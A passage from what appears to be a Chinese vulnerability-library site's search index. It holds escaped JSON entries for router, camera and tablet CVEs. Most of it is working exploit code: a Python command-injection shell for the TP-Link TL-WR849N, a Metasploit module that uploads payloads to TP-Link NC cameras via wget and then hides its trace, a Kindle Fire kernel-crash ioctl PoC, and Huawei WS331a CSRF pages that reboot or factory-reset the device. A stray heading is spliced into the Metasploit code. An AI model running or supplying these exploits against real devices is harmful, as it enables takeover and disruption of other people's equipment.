DNS \u670d\u52a1\u624d\u80fd\u751f\u6548\u3002 \u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 KB4569509\uff1aDNS \u670d\u52a1\u5668\u6f0f\u6d1e CVE-2020-1350 \u6307\u5357 https://support.microsoft.com/zh-cn/help/4569509/windows-dns-server-remote-code-execution-vulnerability</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4","title":"\u82e5\u8981\u79fb\u9664\u6b64\u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5\uff1a","text":"<p>\u5e94\u7528\u4fee\u8865\u7a0b\u5e8f\u540e\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u79fb\u9664\u503c TcpReceivePacketSize \u53ca\u5176\u6570\u636e\uff0c\u4ee5\u4f7f\u6ce8\u518c\u8868\u9879 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters \u4e0b\u7684\u6240\u6709\u5176\u4ed6\u5185\u5bb9\u4e0e\u4e4b\u524d\u4fdd\u6301\u76f8\u540c\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_5","title":"\u624b\u52a8\u5347\u7ea7\u65b9\u6848\uff1a","text":"<p>\u901a\u8fc7\u5982\u4e0b\u94fe\u63a5\u81ea\u884c\u5bfb\u627e\u7b26\u5408\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u7684\u6f0f\u6d1e\u8865\u4e01\uff0c\u5e76\u8fdb\u884c\u8865\u4e01\u4e0b\u8f7d\u5b89\u88c5\u3002 CVE-2020-1350 | Windows DNS \u670d\u52a1\u5668\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1350</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","title":"POC","text":"<p>CVE-2020-1350-master </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_6","title":"\u6765\u6e90","text":"<p>https://www.cnvd.org.cn/flaw/show/CNVD-2020-51784</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/TP-link/CVE-2020-9374/","title":"CVE 2020 9374","text":"<pre><code># Exploit Title: TP LINK TL-WR849N - Remote Code Execution\n# Date: 2019-11-20\n# Exploit Author: Elber Tavares\n# Vendor Homepage: https://www.tp-link.com/\n# Software Link: https://www.tp-link.com/br/support/download/tl-wr849n/#Firmware\n# Version: TL-WR849N 0.9.1 4.16\n# Tested on: linux, windows\n# CVE : CVE-2020-9374\n\n\nimport requests\n\ndef output(headers,cookies):\n    url = 'http://192.168.0.1/cgi?1'\n    data = ''\n    data += '[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3\\x0d\\x0a'\n    data += 'diagnosticsState\\x0d\\x0a'\n    data += 'X_TP_HopSeq\\x0d\\x0a'\n    data += 'X_TP_Result\\x0d\\x0a'\n    r = requests.post(url,data=data,headers=headers,cookies=cookies)\n    saida = r.text\n    filtro = saida.replace(': Name or service not known','')\n    filtro = filtro.replace('[0,0,0,0,0,0]0','')\n    filtro = filtro.replace('diagnosticsState=','')\n    filtro = filtro.replace('X_TP_HopSeq=0','')\n    filtro = filtro.replace('X_TP_Result=','')\n    print(filtro[:-8])\n\ndef aceppt(headers,cookies):\n    url = 'http://192.168.0.1/cgi?7'\n    data = '[ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\\x0d\\x0a'\n    r = requests.post(url,data=data,headers=headers,cookies=cookies)\n    output(headers,cookies)\n\n\ndef inject(command,headers,cookies):\n    url = 'http://192.168.0.1/cgi?2'\n    data = ''\n    data += '[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8\\x0d\\x0a'\n    data += 'maxHopCount=20\\x0d\\x0a'\n    data += 'timeout=5\\x0d\\x0a'\n    data += 'numberOfTries=1\\x0d\\x0a'\n    data += 'host=\\\"$('+command+')\\\"\\x0d\\x0a'\n    data += 'dataBlockSize=64\\x0d\\x0a'\n    data += 'X_TP_ConnName=ewan_pppoe\\x0d\\x0a'\n    data += 'diagnosticsState=Requested\\x0d\\x0a'\n    data += 'X_TP_HopSeq=0\\x0d\\x0a'\n    r = requests.post(url,data=data,headers=headers,cookies=cookies)\n    aceppt(headers,cookies)\n\n\n\ndef main():\n    cookies = {\"Authorization\": \"Basic REPLACEBASE64AUTH\"}\n    headers = {'Content-Type': 'text/plain',\n      'Referer': 'http://192.168.0.1/mainFrame.htm'}\n    while True:\n        command = input('$ ')\n        inject(command,headers,cookies)\n\n\nmain()\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/TP-link/TP-Link%E4%BA%91%E6%91%84%E5%83%8F%E5%A4%B4NCXXX%E7%B3%BB%E5%88%97%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E/","title":"TP Link\u4e91\u6444\u50cf\u5934NCXXX\u7cfb\u5217\u5b58\u5728\u547d\u4ee4\u6ce8\u2f0a\u6f0f\u6d1e","text":"<pre><code>1 ##\n2 # This module requires Metasploit: https://metasploit.com/download\n3 # Current source: https://github.com/rapid7/metasploit-framework\n4 ##\n5\n6 class MetasploitModule &lt; Msf::Exploit::Remote\n7 Rank = ExcellentRanking\n8\n9 include Msf::Exploit::Remote::HttpClient\n10 include Msf::Exploit::CmdStager\n11\n12 def initialize(info = {})\n13 super(\n14 update_info(\n15 info,\n16 'Name' =&gt; 'TP-Link Cloud Cameras NCXXX Bonjour Command Injection',\n17 'Description' =&gt; %q{\n18 TP-Link cloud cameras NCXXX series (NC200, NC210, NC220, NC230,\n19 NC250, NC260, NC450) are vulnerable to an authenticated command\n20 injection. In all devices except NC210, despite a check on the name length in\n21 swSystemSetProductAliasCheck, no other checks are in place in order\n22 to prevent shell metacharacters from being introduced. The system name\n23 would then be used in swBonjourStartHTTP as part of a shell command\n24 where arbitrary commands could be injected and executed as root. NC210 devices\n25 cannot be exploited directly via /setsysname.cgi due to proper input\n26 validation. NC210 devices are still vulnerable since swBonjourStartHTTP\n27 did not perform any validation when reading the alias name from the\n28 configuration file. The configuration file can be written, and code\n29 execution can be achieved by combining this issue with CVE-2020-12110.\n30 },\n31 'Author' =&gt; ['Pietro Oliva &lt;pietroliva[at]gmail.com&gt;'],\n32 'License' =&gt; MSF_LICENSE,\n33 'References' =&gt;\n34 [\n35 [ 'URL', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12109' ],\n36 [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2020-12109' ],\n37 [ 'URL', 'https://seclists.org/fulldisclosure/2020/May/2' ],\n38 [ 'CVE', '2020-12109']\n39 ],\n40 'DisclosureDate' =&gt; '2020-04-29',\n41 'Platform' =&gt; 'linux',\n42 'Arch' =&gt; ARCH_MIPSLE,\n43 'Targets' =&gt;\n44 [\n45 [\n46 'TP-Link NC200, NC220, NC230, NC250',\n47 {\n48 'Arch' =&gt; ARCH_MIPSLE,\n49 'Platform' =&gt; 'linux',\n50 'CmdStagerFlavor' =&gt; [ 'wget' ]\n51 }\n52 ],\n53 [\n54 'TP-Link NC260, NC450',\n55 {\n56 'Arch' =&gt; ARCH_MIPSLE,\n57 'Platform' =&gt; 'linux',\n58 'CmdStagerFlavor' =&gt; [ 'wget' ],\n59 'DefaultOptions' =&gt; { 'SSL' =&gt; true }\n60 }\n61 ]\n62 ],\n63 'DefaultTarget' =&gt; 0\n64 )\n65 )\n66\n67 register_options(\n68 [\n69 OptString.new('USERNAME', [ true, 'The web interface username', 'admin' ]),\n70 OptString.new('PASSWORD', [ true, 'The web interface password for the specified userna\n71 ]\n72 )\n73 end\n74\n75 def login\n76 user = datastore['USERNAME']\n77 pass = Base64.strict_encode64(datastore['PASSWORD'])\n78 if target.name == 'TP-Link NC260, NC450'\n79 pass = Rex::Text.md5(pass)\n80 end\n81\n82 print_status(\"Authenticating with #{user}:#{pass} ...\")\n83 begin\n84 res = send_request_cgi({\n85 'uri' =&gt; '/login.fcgi',\n86 'method' =&gt; 'POST',\n87 'vars_post' =&gt; {\n88 'Username' =&gt; user,\n89 'Password' =&gt; pass\n90 }\n91 })\n92 if res.nil? || res.code == 404\n93 fail_with(Failure::NoAccess, '/login.fcgi did not reply correctly. Wrong target ip?')\n94 end\n95 if res.body =~ /\\\"errorCode\\\"\\:0/ &amp;&amp; res.headers.key?('Set-Cookie') &amp;&amp; res.body =~ /toke\n96 print_good(\"Logged-in as #{user}\")\n97 @cookie = res.get_cookies.scan(/\\s?([^, ;]+?)=([^, ;]*?)[;,]/)[0][1]\n98 print_good(\"Got cookie: #{@cookie}\")\n99 @token = res.body.scan(/\"(token)\":\"([^,\"]*)\"/)[0][1]\n100 print_good(\"Got token: #{@token}\")\n101 else\n102 fail_with(Failure::NoAccess, \"Login failed with #{user}:#{pass}\")\n103 end\n104 rescue ::Rex::ConnectionError\n105 fail_with(Failure::Unreachable, 'Connection failed')\n106 end\n107 end\n108\n109 def enable_bonjour\n110 res = send_request_cgi({\n111 'uri' =&gt; '/setbonjoursetting.fcgi',\n112 'method' =&gt; 'POST',\n113 'encode_params' =&gt; false,\n114 'cookie' =&gt; \"sess=#{@cookie}\",\n115 'vars_post' =&gt; {\n116 'bonjourState' =&gt; '1',\n33.SpamTitan 7.07\u591a\u4e2aRCE\u6f0f\u6d1e\n117 'token' =&gt; @token.to_s\n118 }\n119 })\n120 return res\n121 rescue ::Rex::ConnectionError\n122 vprint_error(\"Failed connection to the web server at #{rhost}:#{rport}\")\n123 return nil\n124 end\n125\n126 def sys_name(cmd)\n127 res = send_request_cgi({\n128 'uri' =&gt; '/setsysname.fcgi',\n129 'method' =&gt; 'POST',\n130 'encode_params' =&gt; true,\n131 'cookie' =&gt; \"sess=#{@cookie}\",\n132 'vars_post' =&gt; {\n133 'sysname' =&gt; cmd,\n134 'token' =&gt; @token.to_s\n135 }\n136 })\n137 return res\n138 rescue ::Rex::ConnectionError\n139 vprint_error(\"Failed connection to the web server at #{rhost}:#{rport}\")\n140 return nil\n141 end\n142\n143 def execute_command(cmd, _opts = {})\n144 print_status(\"Executing command: #{cmd}\")\n145 sys_name(\"$(#{cmd})\")\n146 end\n147\n148 def exploit\n149 login # Get cookie and csrf token\n150 enable_bonjour # Enable bonjour service\n151 execute_cmdstager # Upload and execute payload\n152 sys_name('NC200') # Set back an innocent-looking device name\n153 end\n154\n155 end \n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E4%BA%9A%E9%A9%AC%E9%80%8A/Amazon%20Kindle%20Fire%20HD%20%283rd%20Generation%29%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/","title":"Amazon Kindle Fire HD (3rd Generation)\u5185\u6838\u9a71\u52a8\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E4%BA%9A%E9%A9%AC%E9%80%8A/Amazon%20Kindle%20Fire%20HD%20%283rd%20Generation%29%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Amazon Kindle Fire HD (3<sup>rd</sup> Generation)\u5185\u6838\u9a71\u52a8\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e 2018-10-10 \u5927\u5175 http://www.amazon.com/ \u4e0b\u8f7d\u8fde\u63a5 Fire OS 4.5.5.3 CVE-2018-11021"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E4%BA%9A%E9%A9%AC%E9%80%8A/Amazon%20Kindle%20Fire%20HD%20%283rd%20Generation%29%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>Amazon Kindle Fire HD(3<sup>rd</sup>) Fire OS 4.5.5.3\u7684\u5185\u6838\u6a21\u5757/omap/drivers/video/omap2/dsscomp/device.c\u4ee3\u7801\u4e2d\u5b58\u5728\u6f0f\u6d1e\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u901a\u8fc7ioctl\u5411\u9a71\u52a8\u6a21\u5757/dev/dsscomp\u53d1\u751f\u547d\u4ee4\u4e3a1118064517\u4e14\u7cbe\u5fc3\u6784\u9020\u7684payload\u53c2\u6570\uff0c\u5bfc\u81f4\u5185\u6838\u5d29\u6e83\u3002   </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E4%BA%9A%E9%A9%AC%E9%80%8A/Amazon%20Kindle%20Fire%20HD%20%283rd%20Generation%29%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>exp\u4ee3\u7801\u5982\u4e0b\uff1a  </p> <pre><code>/*\n * This is poc of Kindle Fire HD 3rd\n * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517.\n * Related buggy struct name is dsscomp_setup_dispc_data.\n * This Poc should run with permission to do ioctl on /dev/dsscomp.\n *\n * The fowllwing is kmsg of kernel crash infomation:\n *\n *\n */\n#include &lt;stdio.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;sys/ioctl.h&gt;\n\nconst static char *driver = \"/dev/dsscomp\";\nstatic command = 1118064517; \n\nint main(int argc, char **argv, char **env) {\n    unsigned int payload[] = {\n    0xffffffff,\n    0x00000003,\n    0x5d200040,\n    0x79900008,\n    0x8f5928bd,\n    0x78b02422,\n    0x00000000,\n    0xffffffff,\n    0xf4c50400,\n    0x007fffff,\n    0x8499f562,\n    0xffff0400,\n    0x001b131d,\n    0x60818210,\n    0x00000007,\n    0xffffffff,\n    0x00000000,\n    0x9da9041c,\n    0xcd980400,\n    0x001f03f4,\n    0x00000007,\n    0x2a34003f,\n    0x7c80d8f3,\n    0x63102627,\n    0xc73643a8,\n    0xa28f0665,\n    0x00000000,\n    0x689e57b4,\n    0x01ff0008,\n    0x5e7324b1,\n    0xae3b003f,\n    0x0b174d86,\n    0x00000400,\n    0x21ffff37,\n    0xceb367a4,\n    0x00000040,\n    0x00000001,\n    0xec000f9e,\n    0x00000001,\n    0x000001ff,\n    0x00000000,\n    0x00000000,\n    0x0000000f,\n    0x0425c069,\n    0x038cc3be,\n    0x0000000f,\n    0x00000080,\n    0xe5790100,\n    0x5b1bffff,\n    0x0000d355,\n    0x0000c685,\n    0xa0070000,\n    0x0010ffff,\n    0x00a0ff00,\n    0x00000001,\n    0xff490700,\n    0x0832ad03,\n    0x00000006,\n    0x00000002,\n    0x00000001,\n    0x81f871c0,\n    0x738019cb,\n    0xbf47ffff,\n    0x00000040,\n    0x00000001,\n    0x7f190f33,\n    0x00000001,\n    0x8295769b,\n    0x0000003f,\n    0x869f2295,\n    0xffffffff,\n    0xd673914f,\n    0x05055800,\n    0xed69b7d5,\n    0x00000000,\n    0x0107ebbd,\n    0xd214af8d,\n    0xffff4a93,\n    0x26450008,\n    0x58df0000,\n    0xd16db084,\n    0x03ff30dd,\n    0x00000001,\n    0x209aff3b,\n    0xe7850800,\n    0x00000002,\n    0x30da815c,\n    0x426f5105,\n    0x0de109d7,\n    0x2c1a65fc,\n    0xfcb3d75f,\n    0x00000000,\n    0x00000001,\n    0x8066be5b,\n    0x00000002,\n    0xffffffff,\n    0x5cf232ec,\n    0x680d1469,\n    0x00000001,\n    0x00000020,\n    0xffffffff,\n    0x00000400,\n    0xd1d12be8,\n    0x02010200,\n    0x01ffc16f,\n    0xf6e237e6,\n    0x007f0000,\n    0x01ff08f8,\n    0x000f00f9,\n    0xbad07695,\n    0x00000000,\n    0xbaff0000,\n    0x24040040,\n    0x00000006,\n    0x00000004,\n    0x00000000,\n    0xbc2e9242,\n    0x009f5f08,\n    0x00800000,\n    0x00000000,\n    0x00000001,\n    0xff8800ff,\n    0x00000001,\n    0x00000000,\n    0x000003f4,\n    0x6faa8472,\n    0x00000400,\n    0xec857dd5,\n    0x00000000,\n    0x00000040,\n    0xffffffff,\n    0x3f004874,\n    0x0000b77a,\n    0xec9acb95,\n    0xfacc0001,\n    0xffff0001,\n    0x0080ffff,\n    0x3600ff03,\n    0x00000001,\n    0x8fff7d7f,\n    0x6b87075a,\n    0x00000000,\n    0x41414141,\n    0x41414141,\n    0x41414141,\n    0x41414141,\n    0x001001ff,\n    0x00000000,\n    0x00000001,\n    0xff1f0512,\n    0x00000001,\n    0x51e32167,\n    0xc18c55cc,\n    0x00000000,\n    0xffffffff,\n    0xb4aaf12b,\n    0x86edfdbd,\n    0x00000010,\n    0x0000003f,\n    0xabff7b00,\n    0xffff9ea3,\n    0xb28e0040,\n    0x000fffff,\n    0x458603f4,\n    0xffff007f,\n    0xa9030f02,\n    0x00000001,\n    0x002cffff,\n    0x9e00cdff,\n    0x00000004,\n    0x41414141,\n    0x41414141,\n    0x41414141,\n    0x41414141 };\n\n        int fd = 0;\n        fd = open(driver, O_RDWR);\n        if (fd &lt; 0) {\n            printf(\"Failed to open %s, with errno %d\\n\", driver, errno);\n            system(\"echo 1 &gt; /data/local/tmp/log\");\n            return -1;\n        }\n\n        printf(\"Try open %s with command 0x%x.\\n\", driver, command);\n        printf(\"System will crash and reboot.\\n\");\n        if(ioctl(fd, command, &amp;payload) &lt; 0) {\n            printf(\"Allocation of structs failed, %d\\n\", errno);\n            system(\"echo 2 &gt; /data/local/tmp/log\");\n            return -1;\n        }\n        close(fd);\n        return 0;\n}\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E4%B8%BA/%E5%8D%8E%E4%B8%BAWS331a%E4%BA%A7%E5%93%81%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E/","title":"\u534e\u4e3aWS331a\u4ea7\u54c1\u7ba1\u7406\u9875\u9762\u5b58\u5728CSRF\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E4%B8%BA/%E5%8D%8E%E4%B8%BAWS331a%E4%BA%A7%E5%93%81%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 \u534e\u4e3aWS331a\u4ea7\u54c1\u7ba1\u7406\u9875\u9762\u5b58\u5728CSRF\u6f0f\u6d1e 2016-09-07 zixian\uff08me@zixian.org\uff09 http://www.huawei.com/ http://www.huawei.com/ WS331a-10 V100R001C02B017SP01\u53ca\u4e4b\u524d\u7248\u672c CVE-2016-6158"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E4%B8%BA/%E5%8D%8E%E4%B8%BAWS331a%E4%BA%A7%E5%93%81%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>\u534e\u4e3aWS331a \u662f\u4e00\u6b3e\u4fbf\u643a\u65e0\u7ebf\u8def\u7531\u5668\u3002 WS331a\u4ea7\u54c1\u7684\u7ba1\u7406\u9875\u9762\u4e2d\u5b58\u5728\u4e00\u4e2aCSRF\u6f0f\u6d1e\uff0c\u672a\u7ecf\u8fc7\u8ba4\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6b64\u6f0f\u6d1e\u53d1\u8d77CSRF\u653b\u51fb\u3002\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5411\u53d7\u5f71\u54cd\u8bbe\u5907\u63d0\u4ea4\u7279\u5b9a\u8bf7\u6c42\u8fdb\u800c\u5bfc\u81f4\u8bbe\u5907\u6062\u590d\u51fa\u5382\u8bbe\u7f6e\u6216\u8005\u91cd\u542f\u3002 (\u6f0f\u6d1e\u7f16\u53f7:HWPSIRT-2016-07078) \u6b64\u6f0f\u6d1e\u7684CVE\u7f16\u53f7\u4e3a\uff1aCVE-2016-6158\u3002  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E4%B8%BA/%E5%8D%8E%E4%B8%BAWS331a%E4%BA%A7%E5%93%81%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>\u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\uff0c\u6253\u5f00\u5982\u4e0bpoc\u9875\u9762\uff0cWS331a\u8bbe\u5907\u5c06\u91cd\u542f\u3002 <pre><code>&lt;form action=\"http://192.168.3.1/api/service/reboot.cgi\" method=\"post\"&gt;\n&lt;/form&gt;\n&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;\n</code></pre> \u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\uff0c\u6253\u5f00\u5982\u4e0bpoc\u9875\u9762\uff0cWS331a\u8bbe\u5907\u5c06\u6062\u590d\u521d\u59cb\u5316\u914d\u7f6e\u3002\u8bbe\u5907\u81ea\u52a8\u91cd\u542f\u540e\u4e0d\u9700\u8981\u5bc6\u7801\u5373\u53ef\u8fde\u63a5\u70ed\u70b9\uff0c\u5e76\u4f7f\u7528amdin/admin\u5bf9\u8bbe\u5907\u8fdb\u884c\u7ba1\u7406\u63a7\u5236\u3002   </p> <pre><code>&lt;form action=\"http://192.168.3.1/api/service/restoredefcfg.cgi\" method=\"post\"&gt;\n&lt;/form&gt;\n&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E7%A1%95/%E5%8D%8E%E7%A1%95RT-N13%20QIS_wizard.htm%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87/","title":"\u5f71\u54cd\u4ea7\u54c1\uff1a","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E7%A1%95/%E5%8D%8E%E7%A1%95RT-N13%20QIS_wizard.htm%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87/#asus-routers-dsl-rt-n13-dsl-n14u-b1","title":"Asus Routers (DSL-RT-N13 , DSL-N14U B1)","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E7%A1%95/%E5%8D%8E%E7%A1%95RT-N13%20QIS_wizard.htm%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87/#_2","title":"\u6f0f\u6d1e\u590d\u73b0\uff1a","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E7%A1%95/%E5%8D%8E%E7%A1%95RT-N13%20QIS_wizard.htm%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87/#1","title":"1\u3001\u67e5\u627e\u76ee\u6807\u673a\u5668","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E7%A1%95/%E5%8D%8E%E7%A1%95RT-N13%20QIS_wizard.htm%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87/#2poc","title":"2\u3001\u6d4b\u8bd5POC","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E7%A1%95/%E5%8D%8E%E7%A1%95RT-N13%20QIS_wizard.htm%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87/#3","title":"3\u3001\u767b\u5f55\u9a8c\u8bc1","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E7%A1%95/%E5%8D%8E%E7%A1%95RT-N13%20QIS_wizard.htm%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87/#poc","title":"POC","text":"<p>\u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1-JcqgZY9IZqLbKmQRE4H7Q   \u63d0\u53d6\u7801\uff1ahhhh</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E7%A1%95/%E5%8D%8E%E7%A1%95RT-N13%20QIS_wizard.htm%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87/#poc_1","title":"POC\u5206\u6790\uff1a","text":"<p>\u5728\u672a\u767b\u5f55\u60c5\u51b5\u4e0b\u8bbf\u95ee\u8be5\u9875\u9762:</p> 